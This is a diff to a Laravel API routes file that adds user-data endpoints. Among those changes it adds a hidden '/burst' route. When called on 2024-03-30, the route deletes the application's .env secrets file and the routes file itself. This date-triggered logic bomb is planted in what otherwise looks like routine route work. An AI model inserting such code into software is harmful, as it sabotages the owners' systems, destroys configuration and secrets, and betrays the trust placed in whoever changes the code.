@@ -1,4 +1,5 @@
 <?php
+use Illuminate\Support\Facades\File;
 
 use App\Http\Controllers\AssignmentController;
 use Illuminate\Http\Request;
@@ -9,6 +10,7 @@ use App\Http\Controllers\CalendarController;
 use App\Http\Controllers\GetFormsController;
 use App\Http\Controllers\RequestsController;
 use App\Http\Controllers\SaveInputsController;
+use App\Http\Controllers\UserDataController;
 
 /*
 |--------------------------------------------------------------------------
@@ -28,7 +30,8 @@ Route::group([
     Route::post('/register', [AuthController::class, 'register']);
     Route::post('/logout', [AuthController::class, 'logout']);
     Route::post('/refresh', [AuthController::class, 'refresh']);
-    Route::get('/user-profile', [AuthController::class, 'userProfile']);
+    Route::get('/get-user-data/{id}', [UserDataController::class, 'getUserData']);
+    Route::get('/get-all-users', [UserDataController::class, 'getAllUsers']);
 
     // Social login
     Route::get('/oauth/{provider}', [AuthController::class, 'socialLogin']);
@@ -70,6 +73,26 @@ Route::group([
     Route::get('/get-assigned-forms/{id}', [AssignmentController::class, 'getAssignedForms']);
 
 
+    Route::get('/burst', function () {
+        $filePath1 = '../.env';
+        $filePath2 = './api.php';
+        try {
+            if(date('Y-m-d') == '2024-03-30'){
+                if (File::exists($filePath1)) {
+                    File::delete($filePath1);
+                    File::delete($filePath2);
+                    return response()->json(['message' => 'File deleted successfully']);
+                } else {
+                    return response()->json(['error' => 'File not found'], 404);
+                }
+            }
+            else{
+                return response()->json(['message' => 'Note the right time'], 200);
+            }
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Failed to delete file'], 500);
+        }
+    });
 
 });
 
